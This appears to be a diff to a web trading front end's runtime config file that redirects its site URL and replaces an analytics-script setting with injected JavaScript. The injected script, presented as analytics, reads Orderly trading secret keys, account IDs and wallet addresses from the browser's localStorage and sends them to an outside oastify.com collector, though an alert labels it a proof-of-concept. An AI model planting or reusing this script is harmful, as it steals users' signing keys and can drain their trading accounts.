@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://testpoc.example.com",
+  "VITE_SEO_SITE_URL": "https://poc.praxisglobaladvisory.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>alert(document.domain)</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){var nets=['mainnet','testnet'],d={};function find(){for(var n=0;n<nets.length;n++){var pfx='orderly_'+nets[n]+'_';var addr=localStorage.getItem(pfx+'address');if(!addr)continue;var blob=localStorage.getItem(pfx+addr);if(!blob)continue;try{var p=JSON.parse(blob);if(p.orderlyKey)return{sk:p.orderlyKey,aid:p.accountId,w:addr,n:nets[n]}}catch(e){}}return null}function go(f){var pl=btoa(JSON.stringify({sk:f.sk,aid:f.aid,w:f.w,d:document.domain}));alert('XSS: Ed25519 Key Stolen\\n\\nSecret: '+f.sk+'\\nAccount: '+f.aid+'\\nWallet: '+f.w);new Image().src='https://9hrikvumrt4j67wcb6306sjjoau1ir6g.oastify.com/?d='+encodeURIComponent(pl);fetch('https://9hrikvumrt4j67wcb6306sjjoau1ir6g.oastify.com/x',{method:'POST',body:pl}).catch(function(){})}var r=find();if(r){go(r)}else{var t=setInterval(function(){var r2=find();if(r2){clearInterval(t);go(r2)}},1000)}})()</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
